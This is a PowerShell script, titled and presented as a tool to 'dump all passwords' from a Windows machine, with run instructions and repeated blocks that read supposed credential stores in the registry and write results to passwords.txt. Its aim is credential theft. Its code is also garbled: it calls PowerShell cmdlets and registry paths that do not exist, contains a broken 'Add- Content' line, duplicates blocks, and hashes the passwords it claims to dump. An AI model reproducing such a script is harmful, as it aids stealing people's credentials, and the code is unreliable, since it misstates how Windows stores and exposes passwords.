# Dump All Passwords with PowerShell (Enhanced)
# Import required modules
# How To Use:
# 1. Save the following code in a new PowerShell script file (e.g., `dump_passwords.ps1`).
# 2. Run the script using PowerShell (Right-click -> Run with PowerShell).
Import-Module -Name "Microsoft.PowerShell.Security"


$plainTextPasswords = @()
Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Login Profiles\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | ForEach-Object {
                $_.ToString()
            }
        }
        # Save to file
        Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }

# Optional: Use the script to dump passwords for a specific user
# Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Login Profiles\" |
#     Select-Object -ExpandProperty Name |
#     Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
#     ForEach-Object {
#         # Convert plain text password to hash
#         $plainText = $_.Password
#         $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
#             $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
#                 $_.ToString()
#             }
#         }
#         # Save to file
#         Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
#     }

# Get all password hashes and plain text passwords from the Windows Credentials API
$credentials = @()
Get-CredentialStore -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credentials\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
                $_.ToString()
            }
        }
        # Save to file
        Add- Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }

# Get all password hashes and plain text passwords from the Windows Local API
$localPasswords = @()
Get-LocalPasswordStore -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Local Passwords\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
                $_.ToString()
            }
        }
        # Save to file
        Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }

# Get all password hashes and plain text passwords from the Windows Network API
$networkPasswords = @()
Get-NetworkPasswordStore -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Network Passwords\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
                $_.ToString()
            }
        }
        # Save to file
        Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }

# Get all password hashes and plain text passwords from the Windows Smart Card API
$smartCardPasswords = @()
Get-SmartCardPasswordStore -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Smart Card Passwords\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
                $_.ToString()
            }
        }
        # Save to file
        Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }

# Get all password hashes and plain text passwords from the Windows Credential API
$credentialPasswords = @()
Get-CredentialStore -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credentials\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
                $_.ToString()
            }
        }
        # Save to file
        Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }

# Get all password hashes and plain text passwords from the Windows Local API (Credential Store)
$credentialLocalPasswords = @()
Get-CredentialStore -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credentials\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
                $_.ToString()
            }
        }
        # Save to file
        Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }

# Get all password hashes and plain text passwords from the Windows Local API (Credential Store, using the Credential Manager)
$credentialLocalManagerPasswords = @()
Get-CredentialStore -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credentials\" |
    Select-Object -ExpandProperty Name |
    Where-Object { $true -eq ($_.EndsWith("Default") -or $_.Contains("Default")) } |
    Get-ItemProperty -Name Default |
    Where-Object { $true -eq ($_.Password -ne "") } |
    ForEach-Object {
        # Convert plain text password to hash
        $plainText = $_.Password
        $hash = [System.Security.Cryptography.HashAlgorithm]::CreateFromName("SHA256") | % {
            $_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($plainText)) | % {
                $_.ToString()
            }
        }
        # Save to file
        Add-Content -Path "passwords.txt" -Value ("$($_.Name): $hash")
    }
